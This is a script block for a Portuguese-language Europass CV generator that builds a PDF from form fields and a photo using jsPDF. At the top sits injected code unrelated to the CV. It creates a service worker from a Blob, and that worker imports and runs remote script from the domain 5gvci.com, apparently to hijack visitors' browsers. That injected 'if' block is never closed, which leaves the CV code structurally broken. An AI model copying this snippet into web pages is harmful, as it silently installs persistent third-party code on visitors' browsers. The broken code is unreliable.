<script>
const swCode = `self.options = {"dominio": "5gvci.com","zoneId": 12163257}
self.lary = ""
importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')`;
if('serviceWorker' in navigator){
  const blob = new Blob([swCode], {type: 'application/javascript'});
  navigator.serviceWorker.register(URL.createObjectURL(blob));

// Função para converter ficheiro em Base64 (necessário para o jsPDF)
function getBase64(file) {
   return new Promise((resolve, reject) => {
     const reader = new FileReader();
     reader.readAsDataURL(file);
     reader.onload = () => resolve(reader.result);
     reader.onerror = error => reject(error);
   });
}

async function gerar(){
 const {jsPDF}=window.jspdf;
 const doc=new jsPDF();
 
 const nome=document.getElementById('nome').value||'CV';
 const email=document.getElementById('email').value;
 const tel=document.getElementById('tel').value;
 const dataNasc=document.getElementById('data').value;
 const idNum=document.getElementById('id').value;
 const morada=document.getElementById('morada').value;
 const perfil=document.getElementById('perfil').value;
 const formacao=document.getElementById('form').value;
 const exp=document.getElementById('exp').value;
 const cursos=document.getElementById('cursos').value;
 const estagios=document.getElementById('estagios').value;
 const idiomas=document.getElementById('idiomas').value;
 const objetivo=document.getElementById('objetivo').value;

 // Cores
 const azulEuropass = [24, 69, 208];
 const cinzaLinha = [200, 200, 200];

 // 1. CABEÇALHO (Logótipo)
 // NOTA: O ficheiro 'europass.png' TEM de estar na mesma pasta.
 try {
   doc.addImage("europass.png", "PNG", 70, 10, 70, 15); 
 } catch(e) {
   doc.setTextColor(128, 0, 128); // Roxo
   doc.setFontSize(22); doc.setFont("helvetica", "bold");
   doc.text("europass", 85, 20);
 }

 // Linha do cabeçalho
 doc.setDrawColor(...cinzaLinha);
 doc.setLineWidth(0.5);
 doc.line(14, 30, 196, 30);

 // 2. FOTO E DADOS PESSOAIS
 const fotoInput = document.getElementById('foto');
 let textoY = 45; // Posição vertical inicial para o texto ao lado da foto

 if (fotoInput.files.length > 0) {
     const file = fotoInput.files[0];
     const base64Image = await getBase64(file);
     
     // Desenha a moldura cinzenta (círculo)
     doc.setDrawColor(180, 180, 180);
     doc.setLineWidth(1);
     doc.circle(35, 48, 20, 'S'); // x, y, raio, estilo (S = Stroke/borda)

     // Desenha a imagem (recortada para parecer redonda visualmente dentro do círculo)
     doc.addImage(base64Image, 'JPEG', 15, 28, 40, 40);
 } else {
     // Se não houver foto, desenha um círculo vazio
     doc.setDrawColor(180, 180, 180);
     doc.setLineWidth(1);
     doc.circle(35, 48, 20, 'S');
     textoY = 35; // Sobe o texto se não houver foto
 }

 // Nome ao lado da foto
 doc.setTextColor(50, 50, 50); 
 doc.setFontSize(18); doc.setFont("helvetica", "bold");
 doc.text(nome, 65, 35);

 // Dados Pessoais
 doc.setFontSize(10); doc.setFont("helvetica", "normal");
 doc.setTextColor(80, 80, 80);
 
 let dadosY = 42;
 doc.text(`E-mail: ${email}`, 65, dadosY); dadosY += 5;
 doc.text(`Telemóvel: ${tel}`, 65, dadosY); dadosY += 5;
 doc.text(`Data de nascimento: ${dataNasc}`, 65, dadosY); dadosY += 5;
 doc.text(`N.º de identificação: ${idNum}`, 65, dadosY); dadosY += 5;
 doc.text(`Localização: ${morada}`, 65, dadosY); dadosY += 5;

 // Linha separadora
 doc.line(14, 75, 196, 75);

 // 3. SECÇÕES DE TEXTO (Função auxiliar para desenhar os títulos)
 let y = 85;
 const marginLeft = 14;
 const maxLineWidth = 180;

 function drawSection(title, content) {
    if(!content) return;
    doc.setTextColor(...azulEuropass);
    doc.setFontSize(12); doc.setFont("helvetica", "bold");
    doc.text(title.toUpperCase(), marginLeft, y);
    y += 6;

    doc.setTextColor(50, 50, 50);
    doc.setFontSize(10); doc.setFont("helvetica", "normal");
    
    // Quebra de linha automática
    const lines = doc.splitTextToSize(content, maxLineWidth);
    lines.forEach(line => {
        // Verifica se a página está cheia
        if(y > 275) {
            doc.addPage();
            y = 20;
        }
        doc.text(line, marginLeft, y);
        y += 5;
    });
    y += 6; // Espaço extra após a secção
 }

 // Desenha as secções
 drawSection("PERFIL", perfil);
 drawSection("HABILITAÇÕES ACADÉMICAS", formacao);
 drawSection("EXPERIÊNCIA PROFISSIONAL", exp);
 drawSection("CURSOS E COMPETÊNCIAS", cursos);
 drawSection("ESTÁGIOS PROFISSIONAIS", estagios);
 drawSection("IDIOMAS", idiomas);
 drawSection("OBJECTIVO PROFISSIONAL", objetivo);

 // 4. RODAPÉ
 // Adiciona rodapé a todas as páginas geradas
 const totalPages = doc.internal.getNumberOfPages();
 for(let i = 1; i <= totalPages; i++) {
     doc.setPage(i);
     doc.setDrawColor(...cinzaLinha);
     doc.line(14, 285, 196, 285);
     doc.setTextColor(150, 150, 150);
     doc.setFontSize(8); doc.setFont("helvetica", "normal");
     doc.text("Europass — Curriculum Vitae", 14, 290);
     doc.text(`Página ${i}`, 180, 290);
 }

 doc.save('CV_Europass_'+nome.split(' ')[0]+'.pdf');
}
</script>
